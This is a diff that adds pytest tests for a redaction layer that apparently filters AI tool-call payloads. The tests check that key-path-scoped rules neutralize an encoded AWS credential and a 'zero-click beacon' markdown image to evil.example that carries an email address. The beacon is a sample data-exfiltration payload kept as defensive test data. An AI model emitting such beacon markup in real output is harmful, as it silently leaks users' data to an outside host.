@@ -392,6 +392,52 @@ async def test_B2_plain_key_matches_at_any_depth(payload, direction):
         assert _tokens_present(json.dumps(lo)) == _tokens_present(json.dumps(so))
 
 
+@pytest.mark.parametrize("content,needle", [
+    ("cfg " + _enc_entities(_AWS), _enc_entities(_AWS)),                   # encoded credential (F3)
+    ("![i](https://evil.example/x?d=" + _EMAIL + ")", "![i](https://evil"),  # zero-click beacon (F4)
+])
+@pytest.mark.parametrize("direction", _DIRECTIONS)
+@pytest.mark.asyncio
+async def test_B2_scoped_floor_neutralizes_encoded_and_beacon_in_key(content, needle, direction):
+    """B2 red-team F3/F4: a key_path-scoped redact rule must run the render-leak floor ON ITS OWN
+    FIELD — an encoded credential / zero-click beacon inside the scoped field must be neutralized
+    (parity with the live posture's scoped preset pass), while siblings outside the key are untouched."""
+    rows = [_row(direction="input", action="redact", scope_type="tool", tool_name="getData",
+                 target_mode="key_path", key_path="args.secret"),
+            _row(direction="output", action="redact", scope_type="tool", tool_name="getData",
+                 target_mode="key_path", key_path="args.secret")]
+    payload = {"args": {"secret": content}, "host": _IP}
+    (lo, lr), (so, sr) = await _pair(payload, posture="redact", rows=rows,
+                                     tool_actions={"getData": "inherit"}, tool="getData",
+                                     direction=direction)
+    assert bool(lr.blocked) == bool(sr.blocked)
+    lb, sb = json.dumps(lo), json.dumps(so)
+    # neutralized on BOTH lanes (byte-parity), and the sibling IP outside args.secret survives raw.
+    assert (needle in lb) == (needle in sb), f"live_raw={needle in lb} seed_raw={needle in sb}"
+    assert needle not in sb, "the scoped field's render-leak must be neutralized, not egressed raw"
+    assert _IP in sb, "a sibling outside the key path must NOT be neutralized (scoped floor)"
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("direction", _DIRECTIONS)
+async def test_B2_scoped_floor_leaves_encoded_secret_OUTSIDE_key_untouched(direction):
+    """The scoped floor must NOT neutralize an encoded secret OUTSIDE the key path — the live posture
+    scopes to the field, so a key='args.secret' rule leaves an encoded token in a sibling forwarded
+    exactly as live does (no over-neutralization)."""
+    rows = [_row(direction="input", action="redact", scope_type="tool", tool_name="getData",
+                 target_mode="key_path", key_path="args.secret"),
+            _row(direction="output", action="redact", scope_type="tool", tool_name="getData",
+                 target_mode="key_path", key_path="args.secret")]
+    payload = {"args": {"secret": "clean", "other": _enc_entities(_AWS)}}
+    (lo, lr), (so, sr) = await _pair(payload, posture="redact", rows=rows,
+                                     tool_actions={"getData": "inherit"}, tool="getData",
+                                     direction=direction)
+    assert bool(lr.blocked) == bool(sr.blocked)
+    if not lr.blocked:
+        enc = _enc_entities(_AWS)
+        assert (enc in json.dumps(lo)) == (enc in json.dumps(so)), "sibling encoded token must match live"
+
+
 @pytest.mark.asyncio
 @pytest.mark.parametrize("direction", _DIRECTIONS)
 async def test_B2_keypath_into_list_masks_not_leaks(direction):
